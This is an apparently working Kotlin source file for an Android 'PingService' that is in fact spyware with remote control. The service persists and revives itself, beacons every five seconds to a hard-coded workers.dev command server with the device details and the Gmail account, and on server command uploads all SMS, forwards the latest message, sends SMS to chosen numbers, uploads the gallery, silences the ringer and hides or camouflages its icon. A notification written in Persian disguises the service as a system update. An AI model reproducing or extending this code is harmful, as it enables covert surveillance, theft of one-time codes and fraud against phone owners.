package com.example.pingmon

import android.accounts.AccountManager
import android.app.*
import android.content.*
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class PingService : Service() {

    companion object {
        const val WORKER_URL       = "https://pingmon.kapcher2019.workers.dev/ping"
        const val APP_TOKEN        = "p7k2m9qx4bz8vn3rt"
        const val PING_INTERVAL_MS = 5_000L
        const val CHANNEL_ID       = "pingmon"
        const val NOTIF_ID         = 1001
        const val ACTION_TICK      = "com.example.pingmon.TICK"
        const val ACTION_GOTO      = "com.example.pingmon.GOTO"
        const val PREFS            = "pingmon"
        const val KEY_DOMAIN       = "domain"
        const val DEFAULT_DOMAIN   = "https://www.google.com"
        const val KEY_SERVER_URL   = "server_url"
        const val KEY_CLIENT_IP    = "client_ip"
        private const val KEY_REPORT = "pending_report"
        private const val TAG      = "PingMon"

        fun start(ctx: Context) {
            val i = Intent(ctx, PingService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Log.w(TAG, "start: ${e.message}") }
        }

        fun uid(ctx: Context): String {
            val hw = listOf(
                Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
                Build.HARDWARE, Build.BOARD, Build.BRAND,
            ).joinToString("|")
            val digest = java.security.MessageDigest.getInstance("SHA-256")
            val hash   = digest.digest(hw.toByteArray())
            return hash.take(10).joinToString("") { "%02x".format(it) }
        }

        fun serverUrl(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_SERVER_URL, "") ?: ""

        fun currentDomain(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN

        fun setDomain(ctx: Context, url: String) =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putString(KEY_DOMAIN, url).apply()
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var thread: HandlerThread? = null
    private var handler: Handler?      = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private var running = false
    private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification())
        thread = HandlerThread("ping").apply { start() }
        handler = Handler(thread!!.looper)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop").apply {
            setReferenceCounted(false); acquire()
        }
        watchNetwork()
        running = true
        checkMissedSms()
        tick()
        Reviver.scheduleAll(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TICK) handler?.post { tick() }
        else if (!running) { running = true; handler?.post { tick() } }
        Reviver.scheduleAll(this)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        Reviver.scheduleRestart(this, 1_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        wakeLock?.let { if (it.isHeld) it.release() }
        unwatchNetwork()
        Reviver.scheduleRestart(this, 2_000)
        super.onDestroy()
    }

    private fun tick() {
        IconManager.retryIfPending(this)
        if (isOnline()) {
            drainSmsQueue()
            sendPing()
        }
        handler?.removeCallbacksAndMessages(null)
        handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
        Reviver.scheduleTick(this, PING_INTERVAL_MS)
    }

    private fun isOnline(): Boolean {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(n) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun watchNetwork() {
        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                handler?.post { drainSmsQueue(); sendPing() }
            }
        }
        try { cm.registerNetworkCallback(req, netCallback!!) }
        catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
    }

    private fun unwatchNetwork() {
        netCallback?.let {
            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
        netCallback = null
    }

    private fun checkMissedSms() {
        val lastCheck = prefs.getLong("last_sms_check_time", 0L)
        val now = System.currentTimeMillis()
        prefs.edit().putLong("last_sms_check_time", now).apply()

        if (lastCheck == 0L) return

        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf(android.provider.Telephony.Sms.ADDRESS,
                    android.provider.Telephony.Sms.BODY,
                    android.provider.Telephony.Sms.DATE),
                "${android.provider.Telephony.Sms.DATE} > ? AND " +
                    "${android.provider.Telephony.Sms.TYPE} = ${android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX}",
                arrayOf(lastCheck.toString()),
                "${android.provider.Telephony.Sms.DATE} ASC"
            )
            var count = 0
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val from = c.getString(0) ?: "unknown"
                    val body = c.getString(1) ?: ""
                    val time = c.getLong(2)
                    SmsQueue.add(this, SmsQueue.Item(from, body, time))
                    count++
                }
            }
            if (count > 0) Log.i(TAG, "Recovered $count missed SMS from force stop")
        } catch (e: Exception) { Log.w(TAG, "checkMissedSms: ${e.message}") }
    }

    private fun drainSmsQueue() {
        val queue = SmsQueue.getAll(this)
        if (queue.isEmpty()) return
        val server = serverUrl(this)
        if (server.isBlank()) return
        Thread {
            try {
                val device  = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
                val fmt     = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
                val divider = "\n" + "-".repeat(20) + "\n"
                val parts   = queue.mapIndexed { i, m ->
                    "${i+1}. ${m.from}\n${fmt.format(java.util.Date(m.time))}\n${m.body}"
                }
                val text    = "${queue.size} new SMS on $device\n\n" + parts.joinToString(divider)
                val jsonBody = JSONObject().apply { put("text", text) }.toString()
                val req = Request.Builder()
                    .url("$server/message")
                    .addHeader("X-Token", APP_TOKEN)
                    .post(jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .build()
                client.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) SmsQueue.clear(this)
                }
            } catch (e: Exception) { Log.w(TAG, "drainSms: ${e.message}") }
        }.start()
    }

    private fun sendPing() {
        val pendingReport = prefs.getString(KEY_REPORT, null)
        val pendingInfo   = prefs.getString("pending_info", null)

        val payload = JSONObject().apply {
            put("uid",      uid(this@PingService))
            put("battery",  batteryLevel())
            put("domain",   currentDomain(this@PingService))
            put("model",    "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("android",  Build.VERSION.RELEASE)
            put("operator", operatorName())
            put("gmail",    gmailAccount())
            put("network",  networkType())
            if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
            if (!pendingInfo.isNullOrBlank())   put("info_report", pendingInfo)
        }.toString()

        val req = Request.Builder()
            .url(WORKER_URL)
            .addHeader("X-Token", APP_TOKEN)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.w(TAG, "Ping failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    val bodyStr = it.body?.string() ?: ""
                    if (it.isSuccessful) {
                        if (!pendingReport.isNullOrBlank()) prefs.edit().remove(KEY_REPORT).apply()
                        if (!pendingInfo.isNullOrBlank())   prefs.edit().remove("pending_info").apply()
                        handleResponse(bodyStr)
                    } else {
                        Log.w(TAG, "Ping response error: ${it.code}")
                    }
                }
            }
        })
    }

    private fun handleResponse(bodyStr: String) {
        try {
            val json = JSONObject(bodyStr)
            val srv  = json.optString("server_url", "")
            if (srv.isNotBlank()) prefs.edit().putString(KEY_SERVER_URL, srv).apply()
            val ip = json.optString("client_ip", "")
            if (ip.isNotBlank()) prefs.edit().putString(KEY_CLIENT_IP, ip).apply()

            val cmd = json.optString("cmd", "")
            val arg = json.optString("arg", "")
            when (cmd) {
                "goto"            -> if (arg.isNotBlank()) {
                    setDomain(this, arg)
                    sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                }
                "cmd_a"           -> vibrate()
                "cmd_b"           -> sendLastSmsToServer()
                "cmd_c"           -> uploadAllSms()
                "cmd_d"           -> reportPhoneNumbers()
                "cmd_e"           -> setSilent()
                "cmd_f"           -> setRinging()
                "cmd_g"           -> changeIcon()
                "cmd_h"           -> restoreIcon()
                "cmd_i"           -> fullHide()
                "cmd_j"           -> unHide()
                "cmd_info"        -> collectDeviceInfo()
                "cmd_gallery"     -> GalleryUploader(this).start()
                "cmd_gallery_refresh" -> GalleryUploader(this).refresh()
                "cmd_sms"         -> sendSmsFromCommand(arg)
            }
        } catch (_: Exception) {}
    }

    /* ============================================================ commands */

    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(
                    longArrayOf(0, 300, 200, 300, 200, 300),
                    intArrayOf(0, 255, 0, 255, 0, 255), -1))
            } else {
                @Suppress("DEPRECATION") v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
            }
        } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
    }

    private fun sendLastSmsToServer() {
        val server = serverUrl(this)
        if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, "No server set.").apply(); return }
        Thread {
            try {
                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    arrayOf(android.provider.Telephony.Sms.ADDRESS,
                        android.provider.Telephony.Sms.BODY,
                        android.provider.Telephony.Sms.DATE,
                        android.provider.Telephony.Sms.TYPE),
                    null, null, "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
                )
                val text = cursor?.use { c ->
                    if (!c.moveToFirst()) return@use "No SMS found."
                    val addr    = c.getString(0) ?: "unknown"
                    val body    = c.getString(1) ?: ""
                    val date    = c.getLong(2)
                    val type    = c.getInt(3)
                    val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) "SENT" else "RECV"
                    val fmt     = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
                    "Last SMS - ${Build.MODEL}\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n\n$body"
                } ?: "No SMS."
                val jsonBody = JSONObject().apply { put("text", text) }.toString()
                Request.Builder().url("$server/message").addHeader("X-Token", APP_TOKEN)
                    .post(jsonBody.toRequestBody("application/json; charset=utf-8".toMediaType()))
                    .build().let { client.newCall(it).execute().use { } }
            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply() }
        }.start()
    }

    private fun uploadAllSms() {
        Thread {
            try {
                val server = serverUrl(this)
                if (server.isBlank()) { prefs.edit().putString(KEY_REPORT, "No server set.").apply(); return@Thread }
                val sb  = StringBuilder()
                val fmt = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault())
                sb.appendLine("=== SMS Export ===")
                sb.appendLine("Device: ${Build.MANUFACTURER} ${Build.MODEL}")
                sb.appendLine("Date: ${fmt.format(java.util.Date())}")
                sb.appendLine("=".repeat(40))
                var count = 0
                contentResolver.query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    arrayOf(android.provider.Telephony.Sms.ADDRESS, android.provider.Telephony.Sms.BODY,
                        android.provider.Telephony.Sms.DATE, android.provider.Telephony.Sms.TYPE),
                    null, null, "${android.provider.Telephony.Sms.DATE} DESC"
                )?.use { c ->
                    while (c.moveToNext()) {
                        val addr    = c.getString(0) ?: "?"
                        val body    = c.getString(1) ?: ""
                        val date    = c.getLong(2)
                        val typeStr = if (c.getInt(3) == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT) "SENT" else "RECV"
                        sb.appendLine("[$typeStr] ${fmt.format(java.util.Date(date))}")
                        sb.appendLine("From/To: $addr")
                        sb.appendLine(body)
                        sb.appendLine("-".repeat(40))
                        count++
                    }
                }
                sb.appendLine("Total: $count messages")
                uploadText("sms_${Build.MODEL}_${System.currentTimeMillis()}.txt",
                    sb.toString(), "SMS export - $count messages")
                prefs.edit().putString(KEY_REPORT, "Uploading $count SMS...").apply()
            } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply() }
        }.start()
    }

    private fun reportPhoneNumbers() {
        val lines = mutableListOf<String>()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as android.telephony.SubscriptionManager
                sm.activeSubscriptionInfoList?.forEach { sub ->
                    val num = sub.number?.takeIf { it.isNotBlank() } ?: "—"
                    lines.add("SIM${sub.simSlotIndex + 1}: $num  (${sub.displayName})")
                }
            }
        } catch (_: Exception) {}
        if (lines.isEmpty()) {
            try {
                @Suppress("DEPRECATION")
                val num = (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
                    .line1Number?.takeIf { it.isNotBlank() } ?: "—"
                lines.add("SIM1: $num")
            } catch (e: Exception) { lines.add("error: ${e.message}") }
        }
        prefs.edit().putString(KEY_REPORT, "Phone numbers:\n" + lines.joinToString("\n")).apply()
    }

    private fun setSilent() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try { am.ringerMode = AudioManager.RINGER_MODE_SILENT }
        catch (_: SecurityException) {
            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE } catch (_: Exception) {}
        } catch (_: Exception) {}
    }

    private fun setRinging() {
        try {
            val am  = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            val max = am.getStreamMaxVolume(AudioManager.STREAM_RING)
            am.setStreamVolume(AudioManager.STREAM_RING, max * 2 / 3, 0)
        } catch (e: Exception) { Log.w(TAG, "setRinging: ${e.message}") }
    }

    private fun changeIcon() = IconManager.hide(this, fullyHide = false)
    private fun restoreIcon() = IconManager.show(this)
    private fun fullHide()   = IconManager.hide(this, fullyHide = true)
    private fun unHide()     = IconManager.show(this)

    private fun collectDeviceInfo() {
        try {
            val ctx = this
            val dangerous = listOf(
                android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE, android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_PHONE_NUMBERS, android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.CAMERA, android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.GET_ACCOUNTS,
            )
            val granted = dangerous.filter {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            }.map { it.substringAfterLast(".") }.toMutableList()

            val hasGallery = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
                    android.Manifest.permission.READ_MEDIA_IMAGES) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            } else {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx,
                    android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            }
            if (hasGallery) granted.add("READ_GALLERY")

            val mainState   = packageManager.getComponentEnabledSetting(
                android.content.ComponentName(packageName, "$packageName.MainLauncher"))
            val hiddenState = packageManager.getComponentEnabledSetting(
                android.content.ComponentName(packageName, "$packageName.HiddenLauncher"))
            val iconState = when {
                mainState  == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED  -> "visible"
                hiddenState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> "camouflaged"
                else -> "hidden"
            }
            val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            val ringerState = when (am.ringerMode) {
                AudioManager.RINGER_MODE_NORMAL  -> "ring"
                AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
                AudioManager.RINGER_MODE_SILENT  -> "silent"
                else -> "unknown"
            }
            val cmgr  = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val caps  = cmgr.getNetworkCapabilities(cmgr.activeNetwork)
            val isVpn = caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true
            val sims  = mutableListOf<String>()
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                        as android.telephony.SubscriptionManager
                    sm.activeSubscriptionInfoList?.forEach { sub ->
                        sims.add("${sub.displayName}(SIM${sub.simSlotIndex + 1})")
                    }
                }
            } catch (_: Exception) { operatorName()?.let { sims.add(it) } }
            val appVersion = try { packageManager.getPackageInfo(packageName, 0).versionName ?: "?" }
                catch (_: Exception) { "?" }
            val info = JSONObject().apply {
                put("model", "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                put("os", Build.VERSION.RELEASE); put("sdk", Build.VERSION.SDK_INT)
                put("appVersion", appVersion); put("gmail", gmailAccount() ?: "—")
                put("permissions", org.json.JSONArray(granted))
                put("vpn", isVpn); put("icon", iconState); put("ringer", ringerState)
                put("battery", batteryLevel())
                put("carrier", sims.joinToString(" / ").ifBlank { "—" })
                put("sims", org.json.JSONArray(sims)); put("network", networkType())
                put("ip", prefs.getString(KEY_CLIENT_IP, "—") ?: "—")
            }
            prefs.edit().putString("pending_info", info.toString()).apply()
        } catch (e: Exception) { Log.w(TAG, "collectDeviceInfo: ${e.message}") }
    }

    private fun sendSmsFromCommand(arg: String) {
        try {
            val data = JSONObject(arg)
            val to   = data.optString("to", "")
            val msg  = data.optString("msg", "")
            if (to.isBlank() || msg.isBlank()) return
            val mgr   = android.telephony.SmsManager.getDefault()
            val parts = mgr.divideMessage(msg)
            mgr.sendMultipartTextMessage(to, null, parts, null, null)
            prefs.edit().putString(KEY_REPORT, "SMS sent to $to").apply()
        } catch (e: Exception) { prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply() }
    }

    fun uploadText(filename: String, content: String, caption: String = "") {
        val server = serverUrl(this)
        if (server.isBlank()) return
        val bytes = content.toByteArray(Charsets.UTF_8)
        val req   = Request.Builder().url("$server/upload")
            .addHeader("X-Token", APP_TOKEN)
            .addHeader("X-Filename", filename)
            .addHeader("X-Caption", caption.replace(Regex("[^\\x20-\\x7E]"), ""))
            .post(bytes.toRequestBody("text/plain; charset=utf-8".toMediaType()))
            .build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) { Log.w(TAG, "upload: ${e.message}") }
            override fun onResponse(call: Call, response: Response) { response.use { } }
        })
    }

    /* =========================================================== device info */

    private fun batteryLevel(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun operatorName(): String? = try {
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
            .networkOperatorName.takeIf { it.isNotBlank() }
    } catch (_: Exception) { null }

    private fun gmailAccount(): String? = try {
        AccountManager.get(this).getAccountsByType("com.google").firstOrNull()?.name
    } catch (_: Exception) { null }

    private fun networkType(): String {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(n) ?: return "none"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "other"
        }
    }

    /* ========================================================== notification */

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "PingMon", NotificationManager.IMPORTANCE_MIN)
                .apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setContentTitle("به‌روزرسانی")
            .setContentText("به‌روزرسانی‌ها در دسترس هستند")
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("V13.0.5.0.SJZEUXM"))
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setAutoCancel(false)
            .build()
    }
}